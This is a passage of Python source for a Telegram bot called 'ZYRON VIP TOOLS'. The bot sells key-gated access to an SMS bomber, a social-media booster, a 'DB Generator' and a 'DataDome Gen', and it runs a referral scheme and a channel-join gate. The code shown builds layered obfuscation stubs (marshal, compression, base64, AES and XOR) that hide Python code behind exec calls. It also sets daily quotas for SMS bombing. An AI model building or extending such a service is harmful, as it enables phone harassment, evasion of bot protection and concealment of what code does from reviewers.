        return "import marshal,lzma,base64\nexec(marshal.loads(lzma.decompress(base64.b16decode({}))))"
    elif method == 27:
        return "import marshal,lzma,base64\nexec(marshal.loads(lzma.decompress(base64.b32decode({}))))"
    elif method == 28:
        return "import marshal,lzma,base64\nexec(marshal.loads(lzma.decompress(base64.b64decode({}))))"
    elif method == 29:
        return "import marshal,gzip,base64\nexec(marshal.loads(gzip.decompress(base64.b16decode({}))))"
    elif method == 30:
        return "import marshal,gzip,base64\nexec(marshal.loads(gzip.decompress(base64.b32decode({}))))"
    elif method == 31:
        return "import marshal,gzip,base64\nexec(marshal.loads(gzip.decompress(base64.b64decode({}))))"
    elif method in (32,33,34,35,36,37,38,39,40):
        decomp = {
            32:"b16d=base64.b16decode(d);d=zlib.decompress(lzma.decompress(b16d))",
            33:"b32d=base64.b32decode(d);d=zlib.decompress(lzma.decompress(b32d))",
            34:"b64d=base64.b64decode(d);d=zlib.decompress(lzma.decompress(b64d))",
            35:"b16d=base64.b16decode(d);d=zlib.decompress(gzip.decompress(b16d))",
            36:"b32d=base64.b32decode(d);d=zlib.decompress(gzip.decompress(b32d))",
            37:"b64d=base64.b64decode(d);d=zlib.decompress(gzip.decompress(b64d))",
            38:"b16d=base64.b16decode(d);d=zlib.decompress(lzma.decompress(gzip.decompress(b16d)))",
            39:"b32d=base64.b32decode(d);d=zlib.decompress(lzma.decompress(gzip.decompress(b32d)))",
            40:"b64d=base64.b64decode(d);d=zlib.decompress(lzma.decompress(gzip.decompress(b64d)))",
        }[method]
        return f"import marshal,zlib,lzma,gzip,base64\nd={{0}}\n{decomp}\nexec(marshal.loads(d))"
    elif method == 41:
        return "import base64\nexec(base64.b64decode({}).decode())"
    elif method == 42:
        return f"""import marshal,zlib,lzma,base64,hashlib
from Crypto.Cipher import AES
AES_KEY={aes_key_str_repr}
def _ad(d):
    n,t,c=d[:16],d[16:32],d[32:]
    return AES.new(hashlib.sha256(AES_KEY).digest()[:32],AES.MODE_EAX,n).decrypt_and_verify(c,t)
d={{0}}
d=base64.b64decode(d);d=_ad(d);d=lzma.decompress(d);d=zlib.decompress(d)
exec(marshal.loads(d))"""
    elif method == 44:
        return f"""import marshal,zlib,lzma,gzip,base64,hashlib
from Crypto.Cipher import AES
AES_KEY={aes_key_str_repr}
XOR_KEY=base64.b64decode({repr(xor_key_encoded)})
def _xd(d,k): return bytes([b^k[i%len(k)]for i,b in enumerate(d)])
def _ad(d):
    n,t,c=d[:16],d[16:32],d[32:]
    return AES.new(hashlib.sha256(AES_KEY).digest()[:32],AES.MODE_EAX,n).decrypt_and_verify(c,t)
d={{0}}
d=base64.b64decode(d);d=_ad(d);d=_xd(d,XOR_KEY)
d=gzip.decompress(d);d=lzma.decompress(d);d=zlib.decompress(d)
exec(marshal.loads(d))"""
    elif method in (100, 200):
        # These methods return the full stub inline — no wrapper needed
        return "{0}"
    else:
        raise ValueError(f"Invalid method {method}")

# ── Method display names ───────────────────────────────────────────────────
ENCRYPTION_METHODS_DISPLAY = {
    1: "Marshal Only", 2: "Zlib Only", 3: "Base16 Only", 4: "Base32 Only", 5: "Base64 Only",
    6: "Lzma Only", 7: "Gzip Only", 8: "Zlib + Base16", 9: "Zlib + Base32", 10: "Zlib + Base64",
    11: "Gzip + Base16", 12: "Gzip + Base32", 13: "Gzip + Base64", 14: "Lzma + Base16",
    15: "Lzma + Base32", 16: "Lzma + Base64", 17: "Marshal + Zlib", 18: "Marshal + Gzip",
    19: "Marshal + Lzma", 20: "Marshal + Base16", 21: "Marshal + Base32", 22: "Marshal + Base64",
    23: "Marshal + Zlib + B16", 24: "Marshal + Zlib + B32", 25: "Marshal + Zlib + B64",
    26: "Marshal + Lzma + B16", 27: "Marshal + Lzma + B32", 28: "Marshal + Lzma + B64",
    29: "Marshal + Gzip + B16", 30: "Marshal + Gzip + B32", 31: "Marshal + Gzip + B64",
    32: "Marshal + Zlib + Lzma + B16", 33: "Marshal + Zlib + Lzma + B32", 34: "Marshal + Zlib + Lzma + B64",
    35: "Marshal + Zlib + Gzip + B16", 36: "Marshal + Zlib + Gzip + B32", 37: "Marshal + Zlib + Gzip + B64",
    38: "Marshal + Zlib + Lzma + Gzip + B16", 39: "Marshal + Zlib + Lzma + Gzip + B32",
    40: "Marshal + Zlib + Lzma + Gzip + B64", 41: "Simple Encoder",
    42: "Strong (AES + Marshal + Zlib + Lzma + B64)",
    44: "Ultra Strong (AES + Marshal + Zlib + Lzma + Gzip + XOR)",
    100: "🟢 LOW  — Marshal + Zlib + Lzma + B64  (×3 layers, fast)",
    200: "🔴 MAX  — AES-256 + ChaCha20 + XOR-256 + Bz2 + Gzip + Lzma + Zlib + Marshal + scrambled stub",
}

ENCRYPTION_METHODS_PER_PAGE = 8


def build_encryption_keyboard(page: int = 0):
    """
    Primary screen: LOW / MAX security level selector.
    Page=99 → legacy method list (paginated).
    """
    if page == 99:
        # Legacy paginated list (methods 1-44)
        keyboard = []
        legacy_keys = sorted([k for k in ENCRYPTION_METHODS_DISPLAY.keys() if k not in (43, 100, 200)])
        total = len(legacy_keys)
        real_page = 0  # always page 0 for legacy
        start = 0; end = ENCRYPTION_METHODS_PER_PAGE
        for m in legacy_keys[start:end]:
            keyboard.append([InlineKeyboardButton(
                f"✨ {m}. {ENCRYPTION_METHODS_DISPLAY[m]}", callback_data=f"enc_method_{m}")])
        keyboard.append([InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ʟᴇᴠᴇʟs", callback_data="enc_page_0")])
        keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_encryption_conv")])
        return InlineKeyboardMarkup(keyboard)

    # Default: security level selector
    keyboard = [
        [InlineKeyboardButton(
            "🟢  LOW  SECURITY",
            callback_data="enc_method_100")],
        [InlineKeyboardButton(
            "🔴  MAX  SECURITY  (NUCLEAR)",
            callback_data="enc_method_200")],
        [InlineKeyboardButton(
            "⚙️  Advanced / Legacy methods",
            callback_data="enc_page_99")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_encryption_conv")],
    ]
    return InlineKeyboardMarkup(keyboard)

SELECTING_ENC_METHOD, SELECTING_ENC_COUNT, UPLOADING_ENC_FILE = range(3)

# ── (logging already configured at top of file — no second setup needed) ──────


# ========== DATA MANAGEMENT FUNCTIONS ==========
def load_existing_data():
    global USER_ACCESS, ACCESS_KEYS, USED_KEYS, USER_STATS, USER_ROLES
    
    if os.path.exists(ACCESS_FILE):
        try:
            with open(ACCESS_FILE, "r") as f:
                data = json.load(f)
                
                if "user_roles" in data:
                    USER_ROLES.update({int(k): v for k, v in data["user_roles"].items()})
                
                if "users" in data:
                    for user in data["users"]:
                        user_id = user["user_id"]
                        if user["access_expires"] is None:
                            USER_ACCESS[user_id] = None
                        else:
                            expire_date = datetime.datetime.fromisoformat(user["access_expires"].replace('Z', '+00:00'))
                            USER_ACCESS[user_id] = expire_date.timestamp()
                        
                        USER_STATS[user_id] = {"generations": user.get("generations", 0), "last_active": user.get("last_active")}
                        if user_id not in USER_ROLES:
                            USER_ROLES[user_id] = user.get("role", "user")
                else:
                    USER_ACCESS = {int(k): (v if v is None else float(v)) for k, v in data.get("user_access", {}).items()}
                    USER_STATS  = {int(k): v for k, v in data.get("user_stats", {}).items()}
                    ACCESS_KEYS = data.get("access_keys", {})
                    USED_KEYS   = set(data.get("used_keys", []))
                    loaded_roles = data.get("user_roles", {})
                    for k, v in loaded_roles.items():
                        USER_ROLES[int(k)] = v
                    for uid in USER_ACCESS.keys():
                        if uid == ADMIN_ID:
                            USER_ROLES[uid] = "owner"
                        elif uid not in USER_ROLES:
                            USER_ROLES[uid] = "user"
                    BANNED_USERS.update(set(data.get("banned_users", [])))

            logging.info(f"Loaded {len(USER_ACCESS)} existing users from access.json")
        except Exception as e:
            logging.error(f"Error loading access.json: {e}")
    
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, "r") as f:
                data = json.load(f)
                if "keys" in data:
                    for key_data in data["keys"]:
                        key = key_data["key"]
                        if not key_data.get("used", False):
                            ACCESS_KEYS[key] = {
                                "expires_at": None,
                                "days": key_data.get("days", 30),
                                "created_by": key_data.get("created_by", ADMIN_ID)
                            }
                        else:
                            USED_KEYS.add(key)
            logging.info(f"Loaded {len(ACCESS_KEYS)} available keys from keys.json")
        except Exception as e:
            logging.error(f"Error loading keys.json: {e}")

    USER_ROLES[ADMIN_ID] = "owner"
    logging.info(f"Loaded {len(USER_ROLES)} user roles.")

    # Load new persistent globals
    if os.path.exists(ACCESS_FILE):
        try:
            with open(ACCESS_FILE, "r") as _f2:
                _d2 = json.load(_f2)
            BLACKLISTED_KEYS.update(_d2.get("blacklisted_keys", []))
            KEY_REDEMPTION_LOG.extend(_d2.get("key_redemption_log", []))
            GLOBAL_STATS.update(_d2.get("global_stats", {}))
            for tool, buckets in _d2.get("tool_hourly_usage", {}).items():
                if tool in TOOL_HOURLY_USAGE:
                    TOOL_HOURLY_USAGE[tool].update({int(k): v for k, v in buckets.items()})
        except Exception as _le:
            logging.warning(f"Could not load extended globals: {_le}")

    global REFERRAL_DATA
    if os.path.exists(REFERRAL_FILE):
        try:
            with open(REFERRAL_FILE, "r") as f:
                raw = json.load(f)
            for k, v in raw.items():
                REFERRAL_DATA[int(k)] = {
                    "referrer": v.get("referrer"),
                    "referred": v.get("referred", []),
                    "joined_channel": v.get("joined_channel", False),
                    "points": v.get("points", 0)
                }
        except Exception as e:
            logging.warning(f"Could not load referrals.json: {e}")

def save_access():
    # Persist the full USER_STATS dict alongside access/role data
    data = {
        "user_access":       {str(k): v for k, v in USER_ACCESS.items()},
        "user_stats":        {str(k): v for k, v in USER_STATS.items()},
        "user_roles":        {str(k): v for k, v in USER_ROLES.items()},
        "access_keys":       ACCESS_KEYS,
        "used_keys":         list(USED_KEYS),
        "banned_users":      list(BANNED_USERS),
        "blacklisted_keys":  list(BLACKLISTED_KEYS),
        "key_redemption_log": KEY_REDEMPTION_LOG[-500:],  # keep last 500 entries
        "global_stats":      GLOBAL_STATS,
        "tool_hourly_usage": TOOL_HOURLY_USAGE,
    }
    # Atomic write: write to tmp then rename so a crash never corrupts the file
    tmp_path = ACCESS_FILE + ".tmp"
    with open(tmp_path, "w") as f:
        json.dump(data, f, indent=2)
    os.replace(tmp_path, ACCESS_FILE)

    # Save referral data
    ref_out = {}
    for uid, rd in REFERRAL_DATA.items():
        ref_out[str(uid)] = {
            "referrer": rd.get("referrer"),
            "referred": rd.get("referred", []),
            "joined_channel": rd.get("joined_channel", False),
            "points": rd.get("points", 0)
        }
    with open(REFERRAL_FILE, "w") as f:
        json.dump(ref_out, f, indent=2)

_save_pending = False
_last_save_time = 0.0
_SAVE_DEBOUNCE = 3.0  # seconds — batch rapid saves into one write

async def save_access_async():
    """Non-blocking debounced save — coalesces rapid writes into one."""
    global _save_pending, _last_save_time
    _save_pending = True
    await asyncio.sleep(_SAVE_DEBOUNCE)
    if _save_pending:
        _save_pending = False
        _last_save_time = time.time()
        await asyncio.get_running_loop().run_in_executor(None, save_access)

def schedule_save(context=None):
    """Schedule a debounced async save. Drop-in for save_access() in handlers."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(save_access_async())
    except RuntimeError:
        save_access()

# ── Async lock for shared state mutations ─────────────────────────────────────
_DATA_LOCK = asyncio.Lock()

# ── Daily usage limits ───────────────────────────────────────────────────────
SMS_BOMB_DAILY_LIMIT  = 3
BOOST_DAILY_LIMIT     = 5
GENERATE_DAILY_LIMIT  = 10

def reset_daily_stats_if_needed(user_id: int):
    """Reset per-day counters if the date has rolled over."""
    today = datetime.date.today().isoformat()
    stats = USER_STATS.setdefault(user_id, {})
    if stats.get("last_reset_date") != today:
        stats["sms_bomb_today"] = 0
        stats["boost_today"]    = 0
        stats["generate_today"] = 0
        stats["last_reset_date"] = today

def has_access(user_id):
    if user_id == ADMIN_ID:
        return True
    
    if MAINTENANCE_MODE:
        return False

    if user_id not in USER_ACCESS:
        return False
    if USER_ACCESS[user_id] is None:
        return True
    return USER_ACCESS[user_id] > datetime.datetime.now().timestamp()

def has_role(user_id: int, required_role: str) -> bool:
    return USER_ROLES.get(user_id) == required_role

# Role hierarchy — higher number = more permissions
ROLE_HIERARCHY = {"user": 0, "basic": 1, "vip": 2, "reseller": 3, "owner": 4}

def is_at_least_role(user_id: int, min_role: str) -> bool:
    user_role_level = ROLE_HIERARCHY.get(USER_ROLES.get(user_id, "user"), 0)
    min_role_level  = ROLE_HIERARCHY.get(min_role, 0)
    return user_role_level >= min_role_level

async def check_expiry_notifications(context: CallbackContext):
    """Job: runs hourly — warns users 24h before their key expires."""
    now = datetime.datetime.now().timestamp()
    for user_id, expires_at in list(USER_ACCESS.items()):
        if expires_at is None:
            continue
        hours_left = (expires_at - now) / 3600
        notified_key = f"expiry_notified_{user_id}"
        if 23 <= hours_left <= 25 and not context.bot_data.get(notified_key):
            context.bot_data[notified_key] = True
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=(
                        "⚠️ *ᴋᴇʏ ᴇxᴘɪʀʏ ᴡᴀʀɴɪɴɢ*\n\n"
                        "Your access expires in ~24 hours.\n"
                        "Contact @ZyronDevv  to renew, or earn time through the 🔗 referral program."
                    ),
                    parse_mode="Markdown"
                )
            except Exception:
                pass

def get_database_stats():
    stats = {}
    total_lines = 0
    
    for db_name, file_path in DATABASE_FILES.items():
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    line_count = sum(1 for line in f if line.strip())
                stats[db_name] = line_count
                total_lines += line_count
            else:
                stats[db_name] = 0
        except Exception as e:
            logging.error(f"Error reading {file_path}: {e}")
            stats[db_name] = 0
    
    return stats, total_lines

async def delete_generated_file(file_path):
    try:
        await asyncio.sleep(180)  # 3 minutes
        if os.path.exists(file_path):
            os.remove(file_path)
            logging.info(f"Deleted generated file: {file_path}")
    except Exception as e:
        logging.error(f"Error deleting file {file_path}: {e}")

# ========== MAIN BOT FUNCTIONS ==========
# ══════════════════════════════════════════════════════════════
# CHANNEL JOIN VERIFICATION + REFERRAL SYSTEM
# ══════════════════════════════════════════════════════════════

async def check_channel_membership(bot, user_id: int) -> bool:
    """Returns True ONLY if user is a member of ALL required channels.
    Tries numeric ID first, falls back to username.
    Fails open (returns True) if the bot is not an admin of a channel,
    so users are never permanently blocked by a config error.
    """
    for ch in REQUIRED_CHANNELS:
        joined = False
        for chat_id in [ch["id"], ch["username"]]:
            try:
                member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
                if member.status in ("member", "administrator", "creator", "restricted"):
                    joined = True
                    break
            except Exception as e:
                err = str(e).lower()
                if any(x in err for x in ["forbidden", "chat_admin_required", "not enough rights",
                                            "bot is not a member", "chat not found", "kicked"]):
                    logging.error(
                        f"[CHANNEL GATE] ⚠️  Bot cannot check membership for {ch['username']} — "
                        f"make the bot an ADMIN of that channel. Failing open. Error: {e}"
                    )
                    joined = True  # fail-open for this channel only
                    break
                logging.warning(f"check_channel_membership ({chat_id}) error for {user_id}: {e}")
        if not joined:
            return False  # user hasn't joined this channel — deny access
    return True  # all channels verified


async def verify_join(update: Update, context: CallbackContext):
    """Called when user taps the ✅ Verify button."""
    query = update.callback_query
    user_id = query.from_user.id
    await safe_answer_callback(query)

    joined = await check_channel_membership(context.bot, user_id)
    if joined:
        # Mark as verified
        if user_id not in REFERRAL_DATA:
            REFERRAL_DATA[user_id] = {"referrer": None, "referred": [], "joined_channel": True}
        else:
            REFERRAL_DATA[user_id]["joined_channel"] = True

        # Credit referrer if any
        referrer_id = REFERRAL_DATA[user_id].get("referrer")
        if referrer_id and referrer_id in REFERRAL_DATA:
            if user_id not in REFERRAL_DATA[referrer_id].get("referred", []):
                REFERRAL_DATA[referrer_id].setdefault("referred", []).append(user_id)
                # Award 1 point for each verified referral
                REFERRAL_DATA[referrer_id]["points"] = REFERRAL_DATA[referrer_id].get("points", 0) + 1
                new_pts = REFERRAL_DATA[referrer_id]["points"]
                # ── Auto-reward: +2 hours access time (#6) ────────────
                _REWARD_SECS = 7200  # 2 hours per referral
                _now_ts = datetime.datetime.now().timestamp()
                _cur = USER_ACCESS.get(referrer_id, _now_ts)
                USER_ACCESS[referrer_id] = max(_cur if _cur else _now_ts, _now_ts) + _REWARD_SECS
                _rem_h = round((USER_ACCESS[referrer_id] - _now_ts) / 3600, 1)
                _expire_str = datetime.datetime.fromtimestamp(USER_ACCESS[referrer_id]).strftime("%b %d, %Y %I:%M %p")
                try:
                    await context.bot.send_message(
                        chat_id=referrer_id,
                        text=(
                            "🎉 *+2h ᴀᴅᴅᴇᴅ!*\n"
                            f"ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ ✅\n\n"
                            f"👥 ᴛᴏᴛᴀʟ ʀᴇғᴇʀʀᴀʟs: *{len(REFERRAL_DATA[referrer_id]['referred'])}*\n"
                            f"⏳ ᴀᴄᴄᴇss ᴇxᴘɪʀᴇs: `{_expire_str}`\n\n"
                            "🔗 ᴋᴇᴇᴘ sʜᴀʀɪɴɢ ᴛᴏ ᴇᴀʀɴ ᴍᴏʀᴇ ᴛɪᴍᴇ!"
                        ),
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
        schedule_save()
        # ── Onboarding after first verify — not before gate (#16) ─
        if not USER_STATS.get(user_id, {}).get("onboarded"):
            USER_STATS.setdefault(user_id, {})["onboarded"] = True
            try:
                await context.bot.send_message(
                    user_id,
                    "👋 *ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs!*\n\n"
                    "📂 ᴅʙ ɢᴇɴᴇʀᴀᴛᴏʀ — ᴜsᴇ ʀɪɢʜᴛ ᴀᴡᴀʏ (ʟɪᴍɪᴛᴇᴅ ᴅᴀɪʟʏ)\n"
                    "💣 sᴍs ʙᴏᴍʙᴇʀ — ʀᴇǫᴜɪʀᴇs ᴋᴇʏ\n"
                    "🚀 sᴏᴄɪᴀʟ ʙᴏᴏsᴛᴇʀ — ʀᴇǫᴜɪʀᴇs ᴋᴇʏ\n"
                    "🔐 ᴇɴᴄʀʏᴘᴛᴏʀ — ᴘʀᴏᴛᴇᴄᴛ ʏᴏᴜʀ .ᴘʏ ғɪʟᴇs\n\n"
                    "📌 ɢᴇᴛ ᴀ ᴋᴇʏ → @ZyronDevv \n"
                    "🔗 ᴏʀ ᴜsᴇ /refer ᴛᴏ ᴇᴀʀɴ +2h ᴘᴇʀ ʀᴇғᴇʀʀᴀʟ!",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        await safe_edit(query.message, 
            "✅  *Verified!*  Welcome to ZYRON VIP TOOLS 🎉\n"
            "Loading menu...",
            parse_mode="Markdown"
        )
        await start(update, context)
    else:
        await safe_edit(query.message,
            "❌ *ɴᴏᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ!*\n\n"
            "ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ *ʙᴏᴛʜ* ᴄʜᴀɴɴᴇʟs ʙᴇғᴏʀᴇ ᴜsɪɴɢ ᴛʜᴇ ʙᴏᴛ:\n\n"
            f"1️⃣ {REQUIRED_CHANNEL}\n"
            f"2️⃣ {REQUIRED_CHANNEL_2}\n\n"
            "ᴛᴀᴘ *✅ ᴠᴇʀɪғʏ* ᴀғᴛᴇʀ ᴊᴏɪɴɪɴɢ ʙᴏᴛʜ.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📢 ᴊᴏɪɴ {REQUIRED_CHANNEL}",  url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
                [InlineKeyboardButton(f"📢 ᴊᴏɪɴ {REQUIRED_CHANNEL_2}", url=f"https://t.me/{REQUIRED_CHANNEL_2.lstrip('@')}")],
                [InlineKeyboardButton("✅ ᴠᴇʀɪғʏ ᴊᴏɪɴ", callback_data="verify_join")]
            ]),
            parse_mode="Markdown"
        )


async def exchange_points(update: Update, context: CallbackContext):
    """Exchange referral points for 3-minute access keys (1 pt = 3 mins)."""
    query = update.callback_query
    user_id = query.from_user.id if query else update.effective_user.id
    if query:
        await safe_answer_callback(query)

    ref_data = REFERRAL_DATA.get(user_id, {})
    points = ref_data.get("points", 0)

    if points <= 0:
        txt = (
            "❌ *ɴᴏ ᴘᴏɪɴᴛs ᴀᴠᴀɪʟᴀʙʟᴇ*\n\n"
            "ʏᴏᴜ ɴᴇᴇᴅ ᴀᴛ ʟᴇᴀsᴛ *1 ᴘᴏɪɴᴛ* ᴛᴏ ᴇxᴄʜᴀɴɢᴇ.\n\n"
            "sʜᴀʀᴇ ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ ᴛᴏ ᴇᴀʀɴ ᴘᴏɪɴᴛs!"
        )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="show_referral")]])
        if query:
            await safe_edit(query.message, txt, reply_markup=kb, parse_mode="Markdown")
        else:
            await update.effective_message.reply_text(txt, reply_markup=kb, parse_mode="Markdown")
        return

    # Generate keys: 1 key per point, each valid 3 minutes
    total_mins = points * 3
    generated_keys = []
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    for _ in range(points):
        while True:
            seg1 = ''.join(random.choices(chars, k=4))
            seg2 = ''.join(random.choices(chars, k=4))
            seg3 = ''.join(random.choices(chars, k=4))
            key = f"{KEY_PREFIX}{seg1}-{seg2}-{seg3}"
            if key not in ACCESS_KEYS and key not in USED_KEYS:
                break
        expires_at = (datetime.datetime.now() + datetime.timedelta(minutes=3)).timestamp()
        GLOBAL_STATS["keys_generated_total"] = GLOBAL_STATS.get("keys_generated_total", 0) + 1
        ACCESS_KEYS[key] = {
            "expires_at": expires_at,
            "days": 3 / (24 * 60),
            "created_by": user_id,
            "created_at": datetime.datetime.now().isoformat(),
            "max_uses": 1,
            "use_count": 0
        }
        generated_keys.append(key)
        logging.info(f"User {user_id} exchanged 1 pt for 3-min key {key}")

    # Deduct points
    REFERRAL_DATA[user_id]["points"] = 0
    schedule_save()

    keys_str = "\n".join(f"  {i+1}. `{k}`" for i, k in enumerate(generated_keys))
    created_str = datetime.datetime.now().strftime('%b %d, %Y  %I:%M %p')
    txt = (
        "╔══════════════════════════╗\n"
        "║  🎁  ᴘᴏɪɴᴛs ᴇxᴄʜᴀɴɢᴇᴅ!  ║\n"
        "╚══════════════════════════╝\n\n"
        f"⭐ ᴘᴏɪɴᴛs ᴜsᴇᴅ  : *{points}*\n"
        f"⏱️ ᴛᴏᴛᴀʟ ᴛɪᴍᴇ   : *{total_mins} ᴍɪɴs*\n"
        f"🔑 ᴋᴇʏs ɢᴇɴ     : *{points}*\n"
        f"📅 ᴄʀᴇᴀᴛᴇᴅ      : `{created_str}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"{keys_str}\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ ᴇᴀᴄʜ ᴋᴇʏ = *3 ᴍɪɴs* ᴀᴄᴄᴇss, sɪɴɢʟᴇ-ᴜsᴇ\n"
        "📞 sᴜᴘᴘᴏʀᴛ: @ZyronDevv "
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ʀᴇғᴇʀʀᴀʟ", callback_data="show_referral")]])
    if query:
        await safe_edit(query.message, txt, reply_markup=kb, parse_mode="Markdown")
    else:
        await update.effective_message.reply_text(txt, reply_markup=kb, parse_mode="Markdown")


async def show_referral_menu(update: Update, context: CallbackContext):
    """Show referral link + stats to user."""
    user_id = update.effective_user.id
    msg = update.message if update.message else (update.callback_query.message if update.callback_query else None)

    ref_data = REFERRAL_DATA.get(user_id, {})
    referred_count = len(ref_data.get("referred", []))
    bot_username = (await context.bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    points = ref_data.get("points", 0)
    mins_available = points * 3

    text = (
        "╔══════════════════════════╗\n"
        "║  🔗  ʀᴇғᴇʀʀᴀʟ sʏsᴛᴇᴍ   ║\n"
        "╚══════════════════════════╝\n\n"
        f"👥 ʀᴇғᴇʀʀᴀʟs  : *{referred_count}*\n"
        f"⭐ ᴘᴏɪɴᴛs     : *{points} ᴘᴛs*\n"
        f"⏱️ ʀᴇᴅᴇᴇᴍᴀʙʟᴇ: *{mins_available} ᴍɪɴs*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📎 *ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ:*\n"
        f"`{ref_link}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 1 ʀᴇғᴇʀʀᴀʟ = 1 ᴘᴛ = 3 ᴍɪɴs ᴀᴄᴄᴇss\n"
        "ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ᴇxᴄʜᴀɴɢᴇ 🎯"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🎁 ᴇxᴄʜᴀɴɢᴇ ᴘᴏɪɴᴛs ({points} ᴘᴛs → {mins_available} ᴍɪɴs)", callback_data="exchange_points")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="back_to_main_menu")]
    ])
    if update.callback_query:
        await safe_answer_callback(update.callback_query)
        await safe_edit(update.callback_query.message, text, reply_markup=kb, parse_mode="Markdown")
    else:
        await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")


async def start(update: Update, context: CallbackContext, edit_message_id: Optional[int] = None, resend_keyboard: bool = True):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("Start function called with no effective message.")
        return

    user = update.message.from_user if update.message else update.callback_query.from_user if update.callback_query else None
    if not user:
        logging.warning("Start function called with no effective user.")
        return

    user_id = user.id

    # ── Clear any stuck awaiting states when user restarts ────────
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_KEY_USES.discard(user_id)
    AWAITING_KEY_TIER.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_ANNOUNCEMENT.discard(user_id)
    AWAITING_DELETE_KEY.discard(user_id)
    AWAITING_FEEDBACK.discard(user_id)
    AWAITING_BOOST_URL.discard(user_id)
    AWAITING_REVOKE_USER.discard(user_id)
    AWAITING_REVOKE_MULTI_KEYS.discard(user_id)
    AWAITING_ROLE_USER_ID.discard(user_id)
    AWAITING_TOOL_UPLOAD.discard(user_id)
    AWAITING_FILE_UPLOAD.discard(user_id)
    context.user_data.pop("action_source", None)

    if user_id not in USER_ROLES:
        USER_ROLES[user_id] = "user"
        schedule_save()

    is_new_user = user_id not in USER_STATS
    if is_new_user:
        USER_STATS[user_id] = {
            "generations": 0, "last_active": None,
            "joined": datetime.datetime.now().isoformat(),
            "onboarded": False
        }
    USER_STATS[user_id]["last_active"] = datetime.datetime.now().isoformat()
    if user.username:
        USER_STATS[user_id]["username"] = user.username

    # One-time onboarding message for brand-new users
    if is_new_user or not USER_STATS[user_id].get("onboarded"):
        USER_STATS[user_id]["onboarded"] = True
        try:
            await current_message.reply_text(
                f"👋  *Welcome to ZYRON VIP TOOLS!*\n"
                "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
                "📂  DB Generator  ·  limited daily\n"
                "💣  SMS Bomber  ·  requires VIP key\n"
                "🚀  Social Booster  ·  requires VIP key\n"
                "🔐  Python Encryptor  ·  free\n"
                "🛡️  DataDome Gen  ·  free\n"
                "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
                "Get a key  ›  @ZyronDevv \n"
                "Earn free time  ›  /refer  (+2h per referral)",
                parse_mode="Markdown"
            )
        except Exception:
            pass
    schedule_save()

    # ── Handle referral deep-link (?start=ref_XXXXX) ──────────────────────────
    if context.args and context.args[0].startswith("ref_"):
        try:
            referrer_id = int(context.args[0][4:])
            if referrer_id != user_id:
                if user_id not in REFERRAL_DATA:
                    REFERRAL_DATA[user_id] = {"referrer": referrer_id, "referred": [], "joined_channel": False}
                elif not REFERRAL_DATA[user_id].get("referrer"):
                    REFERRAL_DATA[user_id]["referrer"] = referrer_id
        except ValueError:
            pass

    # ── Channel membership gate (skip for owner/reseller) ─────────────────────
    if not is_at_least_role(user_id, "reseller"):
        already_verified = REFERRAL_DATA.get(user_id, {}).get("joined_channel", False)
        if not already_verified:
            joined = await check_channel_membership(context.bot, user_id)
            if joined:
                if user_id not in REFERRAL_DATA:
                    REFERRAL_DATA[user_id] = {"referrer": None, "referred": [], "joined_channel": True}
                else:
                    REFERRAL_DATA[user_id]["joined_channel"] = True
                schedule_save()
            else:
                # Show join-required gate — edit in place if from a callback to avoid stacking
                gate_text = (
                    "🔒  *ACCESS REQUIRED*\n"
                    "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
                    f"You must join *both* channels to use this bot:\n"
                    f"• {REQUIRED_CHANNEL}\n"
                    f"• {REQUIRED_CHANNEL_2}\n"
                    "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
                    "1️⃣  Join the channel\n"
                    "2️⃣  Tap  ✅ Verify  below"
                )
                gate_kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"📢 ᴊᴏɪɴ {REQUIRED_CHANNEL}",  url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
